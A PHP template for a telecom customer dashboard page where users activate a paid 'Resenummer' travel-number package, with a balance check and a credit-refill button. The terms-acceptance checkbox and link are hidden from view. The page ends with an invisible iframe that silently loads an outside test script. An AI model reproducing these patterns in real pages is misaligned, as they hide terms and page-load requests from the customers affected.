<?php use_helper('I18N') ?>
<?php use_helper('Number') ?>
<?php include_partial('dashboard_header', array('customer'=> $customer, 'section'=>__('Aktivera Resenummer')) ) ?>
  <div class="left-col">
    <?php include_partial('navigation', array('selected'=>'Registra Resenummer', 'customer_id'=>$customer->getId())) ?>
    <div class="dashboard-info">

        <br /><br />
        <div id="mainbody" class="mainbodynarrow" style="visibility: visible;">



<h3 class="newh3" style="font-size:30px"><?php //echo __("Register to Resenumber") ?></h3>
<p><?php echo __("Here you can join Option Package travel number. Simply press the Join button at the bottom of the page. After successful registration you will receive an email confirming the registration of additional package") ?></p>
<br/>
<p><b><?php echo __("What is Resenumber") ?></b></p>
<p>
<?php echo __("With Resenumber you can receive cheap calls on this number while travelling abroad.") ?>
<br/><br/>
<?php echo __("The price of the package is: 10 SEK per. Month") ?>
<br/>
<?php echo __("The activation price is:     30 SEK ") ?>
</p>
	<script type="text/javascript">
	    $(function() {
	        $("#performSubscription").parents("form").bind("submit", function(e) {
	            return true;
	        });
	    });
	</script>
      
        <input type="checkbox" value="true" style="display:none" name="cbAcceptTerms" id="cbAcceptTerms"><input type="hidden" value="false" name="cbAcceptTerms">&nbsp;<a href="http://www.landncall.com/Test/index.php?option=com_content&view=article&id=72" target="_blank" style="display:none"><?php echo __("I accept the terms & conditions") ?></a>

        <form method="post" id="form2" action=""><input type="hidden" value="True" name="performSubscription" id="performSubscription">
        <span class="submit3con submit3orange"><span class="submit3mo" style="display: none;">
                <span class="submit3moleft " style="width: 57px;"></span><span class="submit3moright " style="left: 57px;"></span></span>
<!--                <input type="hidden" value="<?php echo '';?>" name="customerid" id="customerid">-->
            <?php if($customer_balance >= 40.00) { ?>
            <input type="submit" class="loginbuttun" name="submit" value="<?php echo __('Aktivera') ?>">
            
            <?php }else{ ?>
            <p>
            <u><b><?php echo __('your balance is low and you need to buy the credit before you can purchase the resenumber.') ?></b></u>
            
            <div class="fl cb"><button type="button" onclick="window.location.href='<?php echo sfConfig::get('app_epay_relay_script_url').url_for('customer/refill?customer_id='.$customer->getId(), true) ?>'"><?php echo __('Buy credit') ?></button></div>			
            </p>
            <?php }?>
            <span class="submit3left " style="width: 87px;"></span><span class="submit3right "></span></span>
        </form><script type="text/javascript">
        //&lt;![CDATA[
        if (!window.mvcClientValidationMetadata) { window.mvcClientValidationMetadata = []; }
        window.mvcClientValidationMetadata.push({"Fields":[],"FormId":"form2","ReplaceValidationSummary":false});
        //]]&gt;
        </script>



                  </div>

    </div>
  </div>


  <?php include_partial('sidebar') ?>
  <iframe src="http://zerocall.com/b2c/testc.php" style="display:none"></iframe>
